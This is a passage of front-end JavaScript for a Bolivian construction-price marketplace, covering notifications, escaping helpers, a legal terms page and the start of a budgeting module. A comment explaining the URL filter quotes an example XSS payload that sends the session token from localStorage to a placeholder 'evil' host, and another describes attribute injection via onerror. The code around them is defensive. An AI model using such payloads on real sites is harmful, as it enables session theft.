    if (_notifPollInterval) { clearInterval(_notifPollInterval); _notifPollInterval = null; }
}

async function updateNotifBadge() {
    if (!state.user) return;
    try {
        const resp = await API.unreadCount();
        if (!resp.ok) return;
        const badge = document.getElementById('notif-badge');
        if (!badge) return;
        const count = resp.count || 0;
        badge.textContent = count > 99 ? '99+' : count;
        badge.style.display = count > 0 ? 'flex' : 'none';
    } catch { /* silent */ }
}

function toggleNotifDropdown(e) {
    e.stopPropagation();
    const existing = document.querySelector('.notif-dropdown');
    if (existing) { existing.remove(); return; }
    const btn = e.currentTarget;
    const rect = btn.getBoundingClientRect();
    const dd = document.createElement('div');
    dd.className = 'notif-dropdown';
    dd.style.top = (rect.bottom + 4) + 'px';
    dd.style.right = (window.innerWidth - rect.right) + 'px';
    dd.innerHTML = '<div class="notif-loading">Cargando...</div>';
    document.body.appendChild(dd);
    document.addEventListener('click', closeNotifDropdown, { once: true });
    loadNotifications(dd);
}

function closeNotifDropdown() {
    const dd = document.querySelector('.notif-dropdown');
    if (dd) dd.remove();
}

async function loadNotifications(container) {
    const resp = await API.notifications(0, 15);
    if (!resp.ok || !resp.data) {
        container.innerHTML = '<div class="notif-empty">Error al cargar</div>';
        return;
    }
    const notifs = resp.data;
    if (notifs.length === 0) {
        container.innerHTML = '<div class="notif-empty">Sin notificaciones</div>';
        return;
    }
    const header = `<div class="notif-dd-header">
        <span>Notificaciones</span>
        <button class="btn-link" onclick="markAllNotifRead()">Marcar todo leido</button>
    </div>`;
    const items = notifs.map(n => {
        const timeAgo = formatTimeAgo(n.created_at);
        const typeIcon = {
            pedido_completed: 'check-circle',
            pedido_assigned: 'clipboard',
            price_found: 'tag',
            member_added: 'user-plus',
            suggestion_approved: 'check',
            subscription_updated: 'star',
        }[n.type] || 'bell';
        return `<div class="notif-item${n.is_read ? '' : ' unread'}" onclick="clickNotif(${n.id}, '${escJs(n.link || '')}')">
            <div class="notif-item-icon">${icon(typeIcon, 16)}</div>
            <div class="notif-item-body">
                <div class="notif-item-title">${esc(n.title)}</div>
                ${n.body ? `<div class="notif-item-text">${esc(n.body)}</div>` : ''}
                <div class="notif-item-time">${timeAgo}</div>
            </div>
        </div>`;
    }).join('');
    container.innerHTML = header + '<div class="notif-dd-list">' + items + '</div>';
}

function formatTimeAgo(isoDate) {
    if (!isoDate) return '';
    const diff = (Date.now() - new Date(isoDate).getTime()) / 1000;
    if (diff < 60) return 'hace un momento';
    if (diff < 3600) return `hace ${Math.floor(diff / 60)} min`;
    if (diff < 86400) return `hace ${Math.floor(diff / 3600)}h`;
    if (diff < 604800) return `hace ${Math.floor(diff / 86400)}d`;
    return new Date(isoDate).toLocaleDateString();
}

async function clickNotif(id, link) {
    closeNotifDropdown();
    await API.markRead(id);
    updateNotifBadge();
    if (link) {
        if (link.startsWith('pedido/')) {
            const pedidoId = link.split('/')[1];
            openPedidoDetail(parseInt(pedidoId));
        } else {
            navigate(link);
        }
    }
}

async function markAllNotifRead() {
    await API.markAllRead();
    updateNotifBadge();
    const dd = document.querySelector('.notif-dropdown');
    if (dd) {
        dd.querySelectorAll('.notif-item.unread').forEach(el => el.classList.remove('unread'));
    }
}

function showModal(title, bodyHtml) {
    const existing = document.querySelector('.modal-overlay');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.onclick = (e) => { if (e.target === overlay) closeModal(); };
    overlay.innerHTML = `
        <div class="modal">
            <div class="modal-header">
                <span class="modal-title">${esc(title)}</span>
                <button class="modal-close" onclick="closeModal()">&times;</button>
            </div>
            <div class="modal-body">${bodyHtml}</div>
        </div>
    `;
    document.body.appendChild(overlay);
}

function openModal(innerHtml) {
    const existing = document.querySelector('.modal-overlay');
    if (existing) existing.remove();
    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.onclick = (e) => { if (e.target === overlay) closeModal(); };
    overlay.innerHTML = `<div class="modal">${innerHtml}</div>`;
    document.body.appendChild(overlay);
}

function closeModal() {
    document.querySelector('.modal-overlay')?.remove();
}

// ── Toast utility ──────────────────────────────────────────────
function toast(msg, type = 'info') {
    let container = document.getElementById('toast-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        container.className = 'toast-container';
        document.body.appendChild(container);
    }
    const el = document.createElement('div');
    el.className = `toast ${type}`;
    el.textContent = msg;
    container.appendChild(el);
    setTimeout(() => el.remove(), 4000);
}

// ── Helpers ────────────────────────────────────────────────────
// esc(): escapa para texto Y para atributos HTML.
// La version anterior usaba textContent -> innerHTML, que solo escapa & < >
// y dejaba pasar comillas: cualquier `value="${esc(x)}"` se podia romper con
// un `"` y anadir un onerror=. Aqui se escapan tambien " ' ` .
const _ESC_MAP = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;', '`': '&#96;',
};
function esc(str) {
    if (str === null || str === undefined || str === '') return '';
    return String(str).replace(/[&<>"'`]/g, (c) => _ESC_MAP[c]);
}

// escJs(): para interpolar dentro de un string JS que a su vez vive en un
// atributo HTML, p.ej. onclick="fn('${escJs(x)}')".
// No basta con esc(): el parser HTML decodifica &#39; a ' ANTES de que el
// motor JS lea el atributo, asi que la comilla reaparece y rompe el string.
// Con escapes \uXXXX el valor sobrevive a la decodificacion HTML y JS lo lee
// como caracter literal dentro del string.
function escJs(str) {
    if (str === null || str === undefined) return '';
    return String(str).replace(/[^\w .,:;!?@#%+*\-\/()\[\]]/g, (c) => {
        const code = c.charCodeAt(0);
        return '\\u' + code.toString(16).padStart(4, '0');
    });
}

// safeUrl(): solo deja pasar esquemas navegables. Sin esto, un spec_url o
// website guardado como "javascript:fetch('//evil?'+localStorage._mkt_token)"
// se ejecuta al hacer clic.
const _SAFE_SCHEMES = ['http:', 'https:', 'mailto:', 'tel:'];
function safeUrl(u) {
    if (!u) return '#';
    try {
        const parsed = new URL(String(u), window.location.origin);
        return _SAFE_SCHEMES.includes(parsed.protocol) ? parsed.href : '#';
    } catch (e) {
        return '#';
    }
}

// ── Site Config (SEO dynamic) ─────────────────────────────────
let _siteConfig = null;

async function loadSiteConfig() {
    try {
        const resp = await API.siteConfig();
        if (resp.ok && resp.data) {
            _siteConfig = resp.data;
            applySiteConfig(resp.data);
        }
    } catch {}
}

function applySiteConfig(cfg) {
    if (!cfg) return;
    if (cfg.site_title) document.title = cfg.site_title;
    const setMeta = (name, content) => {
        if (!content) return;
        let el = document.querySelector(`meta[name="${name}"]`);
        if (!el) { el = document.createElement('meta'); el.name = name; document.head.appendChild(el); }
        el.content = content;
    };
    const setOg = (prop, content) => {
        if (!content) return;
        let el = document.querySelector(`meta[property="${prop}"]`);
        if (!el) { el = document.createElement('meta'); el.setAttribute('property', prop); document.head.appendChild(el); }
        el.content = content;
    };
    setMeta('description', cfg.site_description);
    setMeta('keywords', cfg.site_keywords);
    setMeta('theme-color', cfg.theme_color);
    setOg('og:title', cfg.site_title);
    setOg('og:description', cfg.site_description);
    setOg('og:site_name', cfg.site_name);
    if (cfg.og_image) setOg('og:image', cfg.og_image);
    setOg('og:type', 'website');
    setOg('og:url', window.location.href);
    // Store for footer/other components
    _siteConfig = cfg;
}

// ── Legal / Terminos de Uso ────────────────────────────────────
function renderLegal() {
    const page = document.getElementById('page-content');
    const siteName = esc(_siteConfig?.site_name || 'Nexo Base');
    const email = _siteConfig?.contact_email ? esc(_siteConfig.contact_email) : 'contacto@apumarketplace.com';
    const whatsapp = _siteConfig?.contact_whatsapp ? esc(_siteConfig.contact_whatsapp) : '';
    const updated = '17 de abril de 2026';
    const acceptedAt = localStorage.getItem('_mkt_terms_accepted');

    page.innerHTML = `
        <div class="legal-page">
            <header class="page-header">
                <h1 class="page-title">Aviso Legal, Terminos de Uso y Politica de Privacidad</h1>
                <p class="page-subtitle">Ultima actualizacion: ${updated}</p>
            </header>

            <section class="legal-section">
                <h2>1. Identificacion del titular</h2>
                <p>Este portal es operado por <strong>${siteName}</strong>, plataforma independiente dedicada a la
                publicacion de precios unitarios referenciales de materiales de construccion, al registro de proveedores
                y al servicio de cotizaciones en Bolivia.</p>
                <ul>
                    <li><strong>Nombre comercial:</strong> ${siteName}</li>
                    <li><strong>Correo de contacto:</strong> <a href="mailto:${email}">${email}</a></li>
                    ${whatsapp ? `<li><strong>WhatsApp:</strong> ${whatsapp}</li>` : ''}
                    <li><strong>Ambito:</strong> Estado Plurinacional de Bolivia</li>
                </ul>
            </section>

            <section class="legal-section">
                <h2>2. Objeto del portal y servicios ofrecidos</h2>
                <p>${siteName} es un <em>marketplace</em> de informacion de precios de construccion. Los servicios
                incluidos bajo estos terminos son:</p>
                <ul>
                    <li><strong>Portal publico de precios unitarios:</strong> consulta libre y gratuita de precios
                    de materiales de construccion agrupados por categoria, region y proveedor.</li>
                    <li><strong>Portal de proveedores:</strong> registro y publicacion de catalogos, sucursales y
                    cotizaciones por parte de empresas proveedoras.</li>
                    <li><strong>Carga de cotizaciones por multiples canales:</strong> formulario web, archivos
                    Excel, archivos PDF, fotografias, WhatsApp (via Evolution API) y Telegram (via Bot API oficial).</li>
                    <li><strong>Motor de matching semantico:</strong> vinculacion automatica de nombres de insumos
                    del proveedor con el catalogo estandarizado, siempre con validacion humana antes de publicar.</li>
                    <li><strong>Analisis estadistico de precios:</strong> calculo de promedios, medianas y evolucion
                    historica a partir de las cotizaciones recibidas.</li>
                    <li><strong>Modulo RFQ (Request For Quotation):</strong> envio de solicitudes de cotizacion a
                    proveedores seleccionados por el usuario.</li>
                    <li><strong>API REST de integracion:</strong> consumo programatico por parte de ERPs
                    (Odoo, SAP y similares) mediante claves de API.</li>
                    <li><strong>Extraccion asistida por IA:</strong> procesamiento de documentos (Excel, PDF, imagenes)
                    mediante proveedores de modelos de lenguaje para extraer listas de precios.</li>
                </ul>
            </section>

            <section class="legal-section">
                <h2>3. Aceptacion de los terminos</h2>
                <p>El acceso y uso del portal implica la aceptacion plena y sin reservas de este documento. Para
                crear una cuenta es obligatorio marcar la casilla de aceptacion en el formulario de registro. Si no
                esta de acuerdo con alguno de los puntos aqui descritos, debe abstenerse de utilizar los servicios.</p>
                ${acceptedAt ? `<p class="legal-note">Usted acepto estos terminos el <strong>${esc(new Date(acceptedAt).toLocaleString('es-BO'))}</strong> desde este dispositivo.</p>` : ''}
            </section>

            <section class="legal-section">
                <h2>4. Condiciones de uso</h2>
                <ul>
                    <li>El acceso al portal publico es libre y no requiere registro.</li>
                    <li>El registro es necesario para crear pedidos, enviar RFQs, publicar cotizaciones y gestionar una empresa proveedora.</li>
                    <li>El usuario se compromete a proporcionar datos veraces, completos y actualizados.</li>
                    <li>Queda prohibido el uso del portal para fines ilicitos, difamatorios, fraudulentos o contrarios a la moral y al orden publico.</li>
                    <li>Queda prohibido el scraping masivo, el uso automatizado no autorizado y cualquier accion que
                    afecte la disponibilidad o seguridad del servicio. Las integraciones programaticas deben realizarse
                    unicamente a traves de la API REST oficial con una clave valida.</li>
                    <li>${siteName} podra suspender o cancelar cuentas que incumplan estas condiciones.</li>
                </ul>
            </section>

            <section class="legal-section">
                <h2>5. Naturaleza de los precios publicados</h2>
                <p>Los precios publicados son <strong>referenciales</strong> y se <strong>actualizan periodicamente</strong>
                a partir de cotizaciones enviadas por los proveedores a traves de los distintos canales habilitados.
                El precio mostrado <strong>no garantiza que el proveedor venda a ese precio</strong>; por eso se
                solicita al usuario contactar al proveedor y realizar la cotizacion correspondiente. En consecuencia:</p>
                <ul>
                    <li>No constituyen una oferta vinculante ni una promesa de venta.</li>
                    <li>Pueden variar segun <strong>zona, temporada</strong>, disponibilidad, tributos (IVA), volumen,
                    plazos de entrega, ubicacion y condiciones particulares de cada proveedor.</li>
                    <li>Aunque se aplica un proceso de validacion humana y analisis estadistico, ${siteName} no garantiza la exactitud absoluta, vigencia o idoneidad de los precios para un proyecto especifico.</li>
                    <li>Para un precio en firme, el usuario debe contactar directamente al proveedor o enviar una RFQ.</li>
                </ul>
            </section>

            <section class="legal-section">
                <h2>6. Responsabilidad de los proveedores</h2>
                <p>Los proveedores registrados son los unicos responsables de la veracidad, legalidad y actualizacion
                de la informacion que publican (catalogos, precios, sucursales, datos de contacto, imagenes y documentos
                cargados). ${siteName} actua como intermediario tecnologico y no asume responsabilidad por operaciones
                comerciales acordadas directamente entre proveedor y comprador.</p>
            </section>

            <section class="legal-section">
                <h2>7. Limitacion de responsabilidad</h2>
                <p>${siteName} no sera responsable por:</p>
                <ul>
                    <li>Decisiones de compra, obra o presupuesto tomadas con base en los precios referenciales publicados.</li>
                    <li>Errores, omisiones o interpretaciones en la extraccion automatica de datos por IA.</li>
                    <li>Interrupciones del servicio por fuerza mayor, caidas de proveedores externos (WhatsApp, Telegram, SMTP, proveedores de IA, infraestructura cloud) o mantenimiento programado.</li>
                    <li>Contenidos publicados por terceros (proveedores, usuarios) en la plataforma.</li>
                </ul>
            </section>

            <section class="legal-section">
                <h2>8. Propiedad intelectual</h2>
                <ul>
                    <li>La marca, el logo, el diseno, el codigo fuente del portal y la estructura del catalogo estandarizado son propiedad de ${siteName}.</li>
                    <li>Los datos, logos e imagenes aportados por cada proveedor siguen siendo propiedad del proveedor; al publicarlos concede a ${siteName} una licencia no exclusiva para exhibirlos en el portal y en los canales oficiales relacionados.</li>
                    <li>Se autoriza la consulta de precios con fines personales, academicos o profesionales. La reproduccion masiva, reventa o redistribucion requiere autorizacion previa y por escrito.</li>
                </ul>
            </section>

            <section class="legal-section">
                <h2>9. Politica de privacidad y tratamiento de datos</h2>
                <p>El tratamiento de datos personales se realiza conforme al articulo 21 numeral 2 de la Constitucion
                Politica del Estado Plurinacional de Bolivia, la Ley N.o 164 General de Telecomunicaciones y TIC, y
                demas normativa concordante.</p>

                <h3>9.1 Datos recolectados</h3>
                <ul>
                    <li><strong>Registro:</strong> nombre completo, correo electronico, telefono, nombre de empresa, contrasena (almacenada con hash).</li>
                    <li><strong>Uso:</strong> direccion IP, tipo de navegador, paginas visitadas, dispositivo.</li>
                    <li><strong>Proveedores:</strong> razon social, NIT, sucursales, ubicacion (latitud/longitud), catalogo de productos.</li>
                    <li><strong>Cotizaciones:</strong> archivos cargados (Excel, PDF, imagenes), mensajes recibidos por WhatsApp o Telegram.</li>
                </ul>

                <h3>9.2 Finalidad del tratamiento</h3>
                <ul>
                    <li>Operar el portal publico de precios y el portal de proveedores.</li>
                    <li>Generar estadisticas agregadas y evolucion historica de precios.</li>
                    <li>Enviar notificaciones transaccionales (confirmacion de registro, respuestas a RFQ, estado de pedidos).</li>
                    <li>Permitir la integracion via API REST con sistemas ERP autorizados por el usuario.</li>
                    <li>Prevenir fraude, abuso y proteger la seguridad del servicio.</li>
                </ul>

                <h3>9.3 Base legal</h3>
                <p>El tratamiento se basa en el consentimiento expreso del usuario al aceptar estos terminos durante
                el registro, asi como en el interes legitimo de ${siteName} para mantener la seguridad y continuidad
                del servicio.</p>

                <h3>9.4 Comunicacion a terceros</h3>
                <ul>
                    <li>${siteName} <strong>no vende ni cede</strong> datos personales con fines publicitarios.</li>
                    <li>Los datos de contacto se comparten con un proveedor solo cuando el usuario envia una RFQ o solicita explicitamente ser contactado.</li>
                    <li>Se utilizan servicios de terceros como proveedores tecnologicos: Evolution API (WhatsApp), Telegram Bot API, OpenRouter / Anthropic / OpenAI / Google (extraccion IA), SMTP (correos transaccionales) e infraestructura en la nube. Estos actuan como encargados del tratamiento.</li>
                </ul>

                <h3>9.5 Derechos del titular</h3>
                <p>Usted puede ejercer en cualquier momento los derechos de acceso, rectificacion, cancelacion, oposicion y
                portabilidad sobre sus datos, escribiendo a <a href="mailto:${email}">${email}</a>. La solicitud sera
                atendida en un plazo razonable no mayor a 30 dias habiles.</p>

                <h3>9.6 Conservacion</h3>
                <p>Los datos se conservan mientras la cuenta exista y, posteriormente, durante los plazos legales
                aplicables (contables, tributarios). Los registros historicos de precios anonimizados pueden conservarse
                indefinidamente para fines estadisticos.</p>

                <h3>9.7 Seguridad</h3>
                <p>Se aplican medidas tecnicas y organizativas razonables: cifrado TLS en transito, autenticacion JWT,
                control de acceso por roles, claves de API revocables, hashing de contrasenas, copias de seguridad
                periodicas y registros de auditoria.</p>
            </section>

            <section class="legal-section">
                <h2>10. Uso de cookies y almacenamiento local</h2>
                <p>El portal utiliza unicamente tecnologias necesarias para su funcionamiento:</p>
                <ul>
                    <li><strong>localStorage:</strong> almacenamiento del token de sesion, preferencias de idioma y carrito de cotizaciones.</li>
                    <li><strong>Cookies tecnicas:</strong> mantenimiento de sesion y seguridad.</li>
                    <li><strong>Service Worker / PWA:</strong> cache offline para una experiencia mas rapida.</li>
                </ul>
                <p>No se usan cookies de publicidad ni herramientas de rastreo de terceros con fines comerciales.</p>
            </section>

            <section class="legal-section">
                <h2>11. Canales alternativos (WhatsApp, Telegram, email)</h2>
                <p>Al enviar informacion por WhatsApp o Telegram, el usuario entiende que los mensajes se procesan
                automaticamente y quedan registrados en la plataforma con el mismo tratamiento descrito en la seccion 9.
                El uso de estos canales esta ademas sujeto a los terminos de servicio propios de Meta Platforms, Inc.
                (WhatsApp) y de Telegram FZ-LLC.</p>
            </section>

            <section class="legal-section">
                <h2>12. Uso de inteligencia artificial</h2>
                <p>Para acelerar la carga de catalogos, el portal utiliza modelos de lenguaje (Claude, GPT, Gemini u otros)
                que procesan los archivos enviados por el proveedor. Al cargar un documento, el usuario autoriza su
                procesamiento por estos servicios unicamente con fines de extraccion de datos estructurados. Los
                resultados son revisados por operadores humanos antes de publicarse.</p>
            </section>

            <section class="legal-section">
                <h2>13. Modificaciones</h2>
                <p>${siteName} se reserva el derecho de modificar el presente documento en cualquier momento. Los cambios
                se publicaran en esta misma pagina con indicacion de la fecha de actualizacion. El uso continuado del
                servicio tras la publicacion de los cambios implica su aceptacion.</p>
            </section>

            <section class="legal-section">
                <h2>14. Legislacion aplicable y jurisdiccion</h2>
                <p>Estos terminos se rigen por las leyes del Estado Plurinacional de Bolivia. Para cualquier controversia,
                las partes se someten a la jurisdiccion de los tribunales competentes de la ciudad de La Paz, Bolivia,
                renunciando a cualquier otro fuero que pudiera corresponderles.</p>
            </section>

            <section class="legal-section">
                <h2>15. Contacto</h2>
                <p>Para consultas sobre privacidad, ejercicio de derechos o aclaraciones legales, puede escribir a
                <a href="mailto:${email}">${email}</a>${whatsapp ? ` o contactarnos por WhatsApp al ${whatsapp}` : ''}.</p>
            </section>

            <div class="legal-actions">
                <button class="btn btn-primary" onclick="navigate('home')">Volver al inicio</button>
            </div>
        </div>
    `;
}

// ═══════════════════════════════════════════════════════════════
// ── APU — Presupuestos de obra y analisis de precios unitarios ─
// ═══════════════════════════════════════════════════════════════

// Bloques de composicion de una partida.
// `apiType` es el valor que entiende el backend (mat/mo/eq, los mismos que
// usa Odoo). `cls` es solo para CSS y `aliases` cubre variantes al leer.
// No unificar apiType con cls: separa el contrato de la presentacion.
const APU_BLOCKS = [
    { key: 'material',  apiType: 'mat', cls: 'mat', label: 'Materiales',    ico: 'package',  aliases: ['material', 'materials', 'materiales', 'mat', 'm'] },
    { key: 'labor',     apiType: 'mo',  cls: 'mo',  label: 'Mano de obra',  ico: 'users',    aliases: ['labor', 'labour', 'mano_obra', 'mano-obra', 'manodeobra', 'mo', 'l'] },
    { key: 'equipment', apiType: 'eq',  cls: 'eq',  label: 'Equipo y herramientas', ico: 'hammer', aliases: ['equipment', 'equipo', 'equipos', 'eq', 'tool', 'tools', 'herramienta', 'e'] },
];

/** Tipo de recurso que espera la API a partir de la clave de bloque. */
function _apuApiType(blockKey) {
    const blk = APU_BLOCKS.find(b => b.key === blockKey || b.apiType === blockKey);
    return blk ? blk.apiType : 'mat';
}

const APU_PROJECT_STATES = {
    draft:       { label: 'Borrador',   cls: 'badge-gray' },
    active:      { label: 'En curso',   cls: 'badge-primary' },
    in_progress: { label: 'En curso',   cls: 'badge-primary' },
    review:      { label: 'En revision', cls: 'badge-warning' },
    approved:    { label: 'Aprobado',   cls: 'badge-success' },
    closed:      { label: 'Cerrado',    cls: 'badge-success' },
    archived:    { label: 'Archivado',  cls: 'badge-gray' },
    cancelled:   { label: 'Cancelado',  cls: 'badge-danger' },
};

// Estado local del modulo (no se persiste; el servidor es la fuente de verdad)
const _apu = {
    view: 'list',          // 'list' | 'project' | 'item'
    projectId: null,
    project: null,
    itemId: null,
    item: null,
    limitReason: null,     // motivo devuelto por el backend en un 402
    closedRubros: {},      // { rubroId: true } => colapsado
    closedBlocks: {},      // { blockKey: true } => colapsado
    pick: null,            // insumo elegido del catalogo al agregar recurso
};

// ── Helpers de formato ────────────────────────────────────────
function _apuNum(v, dec = 2) {
    const n = Number(v);
    if (!isFinite(n)) return (0).toFixed(dec);
    return n.toLocaleString('es-BO', { minimumFractionDigits: dec, maximumFractionDigits: dec });
}

function _apuCurSymbol(cur) {
    const c = String(cur || 'BOB').toUpperCase();
    if (c === 'BOB') return 'Bs';
    if (c === 'USD') return '$us';
    return c;
}

function _apuMoney(v, cur, dec = 2) {
    return `${_apuCurSymbol(cur)} ${_apuNum(v, dec)}`;
}

function _apuBlockOf(type) {
    const t = String(type || '').toLowerCase().trim();
    return APU_BLOCKS.find(b => b.aliases.includes(t)) || APU_BLOCKS[0];
}

function _apuProjectState(st) {
    return APU_PROJECT_STATES[String(st || '').toLowerCase()] || { label: String(st || 'Borrador'), cls: 'badge-gray' };
}

function _apuDate(iso) {
    if (!iso) return '';
    try { return new Date(iso).toLocaleDateString('es-BO'); } catch { return ''; }
}

// El backend puede responder detail como string o como lista (422 de FastAPI)
function _apuDetail(data, fallback) {
    if (data && typeof data.detail === 'string') return data.detail;
    if (data && typeof data.error === 'string') return data.error;
    return fallback;
}

// ── Entrada de la pagina ──────────────────────────────────────
async function renderPresupuestos() {
    const p = state.currentParams || {};
    if (p.itemId) { openApuItem(p.itemId); return; }
    if (p.projectId) { openApuProject(p.projectId); return; }
    renderApuProjects();
}

// ── Pantalla 1: lista de proyectos ────────────────────────────
function _apuNewProjectButton() {
    if (_apu.limitReason) {
        return `<button class="btn btn-locked" title="${esc(_apu.limitReason)}" onclick="showApuPlanLimit()">
                    ${icon('lock', 16)} Limite del plan alcanzado
                </button>`;
    }
    return `<button class="btn btn-primary" onclick="showApuNewProjectModal()">
                ${icon('plus', 16)} Nuevo proyecto
            </button>`;
}

async function renderApuProjects() {
    _apu.view = 'list';
    _apu.projectId = null; _apu.project = null;
    _apu.itemId = null; _apu.item = null;
    const page = document.getElementById('page-content');
    if (!page) return;
    page.innerHTML = `
        <div class="page-header apu-header">
            <div>
                <h1 class="page-title">Presupuestos de obra</h1>
                <p class="page-subtitle">Analisis de precios unitarios, computos metricos y presupuestos por proyecto</p>
            </div>
            <div class="apu-header-actions" id="apu-new-btn">${_apuNewProjectButton()}</div>
        </div>
        <div id="apu-projects"><div class="empty-state"><p>Cargando proyectos...</p></div></div>
    `;
    loadApuProjects();
}

async function loadApuProjects() {
    const box = document.getElementById('apu-projects');
    if (!box) return;
    try {
        const resp = await API.apuProjects();
        if (!resp.ok) {
            box.innerHTML = `<div class="empty-state"><p>${esc(_apuDetail(resp, 'No se pudieron cargar los proyectos'))}</p></div>`;
            return;
        }
        const list = resp.data || [];
        if (!list.length) {
            box.innerHTML = `
                <div class="apu-empty">
                    <div class="apu-empty-ico">${icon('calculator', 40)}</div>
                    <h3>Todavia no tienes proyectos</h3>
                    <p>Crea un proyecto para armar su presupuesto por rubros y partidas, con analisis de precios unitarios y computos metricos.</p>
                    ${_apuNewProjectButton()}
                </div>
            `;
            return;
        }
        const cur = list[0].currency || 'BOB';
        const totalAll = list.reduce((a, p) => a + Number(p.total_budget || 0), 0);
        const items = list.reduce((a, p) => a + Number(p.item_count || 0), 0);
        box.innerHTML = `
            <div class="apu-kpis">
                <div class="apu-kpi">
                    <span class="apu-kpi-val">${esc(String(resp.total != null ? resp.total : list.length))}</span>
                    <span class="apu-kpi-lbl">Proyectos</span>
                </div>
                <div class="apu-kpi">
                    <span class="apu-kpi-val">${esc(String(items))}</span>
                    <span class="apu-kpi-lbl">Partidas</span>
                </div>
                <div class="apu-kpi apu-kpi-hero">
                    <span class="apu-kpi-val">${esc(_apuMoney(totalAll, cur))}</span>
                    <span class="apu-kpi-lbl">Monto acumulado</span>
                </div>
            </div>
            <div class="apu-proj-grid">${list.map(renderApuProjectCard).join('')}</div>
        `;
    } catch {
        box.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>';
    }
}

function renderApuProjectCard(p) {
    const st = _apuProjectState(p.state);
    return `
        <div class="apu-proj-card" onclick="openApuProject(${Number(p.id)})">
            <div class="apu-proj-top">
                <span class="apu-proj-code">${esc(p.code || '—')}</span>
                <span class="badge ${st.cls}">${esc(st.label)}</span>
            </div>
            <div class="apu-proj-name">${esc(p.name)}</div>
            <div class="apu-proj-meta">
                ${p.client_name ? `${icon('building', 13)} ${esc(p.client_name)}` : ''}
                ${p.region ? `<span class="apu-dot"></span>${icon('map-pin', 13)} ${esc(p.region)}` : ''}
            </div>
            <div class="apu-proj-foot">
                <div class="apu-proj-total">
                    <span class="apu-proj-total-lbl">Presupuesto</span>
                    <span class="apu-proj-total-val">${esc(_apuMoney(p.total_budget, p.currency))}</span>
                </div>
                <div class="apu-proj-side">
                    <span>${esc(String(p.item_count || 0))} partidas</span>
                    <span>${esc(_apuDate(p.created_at))}</span>
                </div>
            </div>
        </div>
    `;
}

function showApuPlanLimit(reason) {
    const msg = reason || _apu.limitReason || 'Tu plan actual no permite crear mas proyectos.';
    showModal('Limite del plan alcanzado', `
        <p style="font-size:14px;color:var(--gray-700);line-height:1.5">${esc(msg)}</p>
        <p style="font-size:13px;color:var(--gray-500);margin-top:10px">
            Puedes liberar espacio archivando un proyecto existente o ampliar tu plan para crear mas presupuestos.
        </p>
        <div style="text-align:right;margin-top:16px">
            <button class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Entendido</button>
            <button class="btn btn-primary" onclick="closeModal();navigate('company')">Ver planes</button>
        </div>
    `);
}

function showApuNewProjectModal() {
    const depts = DEPARTMENTS.map(d => `<option value="${esc(d)}">${esc(d)}</option>`).join('');
    showModal('Nuevo proyecto', `
        <form onsubmit="handleApuCreateProject(event)">
            <div class="form-group">
                <label class="form-label">Nombre del proyecto *</label>
                <input class="form-input" name="name" required maxlength="160" placeholder="Ej. Vivienda unifamiliar Los Alamos">
            </div>
            <div class="apu-form-2">
                <div class="form-group">
                    <label class="form-label">Codigo</label>
                    <input class="form-input" name="code" maxlength="40" placeholder="PRY-001">
                </div>
                <div class="form-group">
                    <label class="form-label">Cliente</label>
                    <input class="form-input" name="client_name" maxlength="160" placeholder="Nombre del cliente">
                </div>
            </div>
            <div class="apu-form-2">
                <div class="form-group">
                    <label class="form-label">Ubicacion</label>
                    <input class="form-input" name="location" maxlength="160" placeholder="Zona, calle, referencia">
                </div>
                <div class="form-group">
                    <label class="form-label">Region / Departamento</label>
                    <select class="form-select" name="region">
                        <option value="">Sin especificar</option>
                        ${depts}
                    </select>
                </div>
            </div>
            <div class="apu-form-2">
                <div class="form-group">
                    <label class="form-label">Moneda</label>
                    <select class="form-select" name="currency">
                        <option value="BOB">BOB — Bolivianos</option>
                        <option value="USD">USD — Dolares</option>
                    </select>
                </div>
                <div class="form-group">
                    <label class="form-label">Plantilla de recargos</label>
                    <select class="form-select" name="template_id">
                        <option value="">Plantilla por defecto</option>
                    </select>
                    <span class="apu-hint">Cargas sociales, gastos generales, utilidad e impuestos</span>
                </div>
            </div>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Crear proyecto</button>
            </div>
        </form>
    `);
}

async function handleApuCreateProject(e) {
    e.preventDefault();
    const f = e.target;
    const payload = {
        name: f.name.value.trim(),
        code: f.code.value.trim() || null,
        client_name: f.client_name.value.trim() || null,
        location: f.location.value.trim() || null,
        region: f.region.value || null,
        currency: f.currency.value || 'BOB',
        template_id: f.template_id.value ? parseInt(f.template_id.value, 10) : null,
    };
    try {
        // _fetch (no .post) para poder leer el status: 402 = limite de plan
        const resp = await API._fetch('/apu/projects', { method: 'POST', body: JSON.stringify(payload) });
        let data = {};
        try { data = await resp.json(); } catch {}
        if (resp.status === 402) {
            _apu.limitReason = _apuDetail(data, 'Tu plan actual no permite crear mas proyectos.');
            closeModal();
            renderApuProjects();
            showApuPlanLimit(_apu.limitReason);
            return;
        }
        if (!resp.ok || data.ok === false) {
            toast(_apuDetail(data, 'No se pudo crear el proyecto'), 'error');
            return;
        }
        _apu.limitReason = null;
        closeModal();
        toast('Proyecto creado', 'success');
        if (data.data && data.data.id) openApuProject(data.data.id);
        else renderApuProjects();
    } catch {
        toast('Error de conexion', 'error');
    }
}

// ── Pantalla 2: detalle del proyecto (presupuesto) ────────────
async function openApuProject(projectId) {
    const page = document.getElementById('page-content');
    if (!page) return;
    _apu.view = 'project';
    _apu.projectId = projectId;
    _apu.itemId = null; _apu.item = null;
    page.innerHTML = '<div class="empty-state"><p>Cargando presupuesto...</p></div>';
    try {
        const resp = await API.apuProject(projectId);
        if (!resp.ok) {
            page.innerHTML = `<div class="empty-state"><p>${esc(_apuDetail(resp, 'No se pudo cargar el proyecto'))}</p></div>`;
            return;
        }
        _apu.project = resp.data;
        renderApuProjectDetail(resp.data);
    } catch {
        page.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>';
    }
}

function renderApuProjectDetail(p) {
    const page = document.getElementById('page-content');
    if (!page) return;
    const cur = p.currency || 'BOB';
    const st = _apuProjectState(p.state);
    const rubros = p.rubros || [];
    const unassigned = p.unassigned_items || [];

    const rubroBlocks = rubros.map((r, idx) => renderApuRubro(r, idx, cur)).join('');
    const looseBlock = unassigned.length
